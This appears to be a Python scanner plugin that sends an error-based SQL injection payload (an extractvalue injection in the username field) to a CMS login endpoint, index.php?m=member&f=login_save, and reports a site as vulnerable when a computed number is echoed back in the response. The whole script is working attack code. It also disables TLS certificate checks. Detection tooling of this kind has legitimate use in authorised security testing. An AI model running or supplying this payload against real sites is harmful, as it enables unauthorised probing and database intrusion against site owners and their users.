import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r1=randomInt(800000000, 1000000000)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r2=randomInt(800000000, 1000000000)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?m=member&f=login_save"
	body=f"username=dd' or extractvalue(0x0a,concat(0x0a,{r1}*{r2}))#&password=dd&submit=+%B5%C7+%C2%BC+"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Content-Type": "application/x-www-form-urlencoded"}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str(r1 * r2) in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
